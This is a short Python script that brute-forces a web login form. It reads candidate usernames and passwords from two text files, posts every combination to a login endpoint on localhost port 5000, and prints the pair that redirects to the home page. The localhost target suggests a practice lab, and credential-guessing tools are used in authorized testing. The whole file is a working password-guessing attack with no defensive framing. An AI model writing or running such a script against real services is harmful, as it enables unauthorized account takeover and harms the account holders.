import requests
import sys

url = "http://127.0.0.1:5000/login"

f = open("login.txt")
login = f.readlines()

g = open("password.txt")
password = g.readlines()
print(login)
print(password)
for i in login:
    for j in password:
        print(i + ' ' + j)
        http = requests.post(url, data={"login": i.strip(), "password": j.strip()})
        # print(http)
        if http.url == 'http://127.0.0.1:5000/home':
            print('==================================Login', i.strip())
            print('==================================Password', j.strip())
            sys.exit()

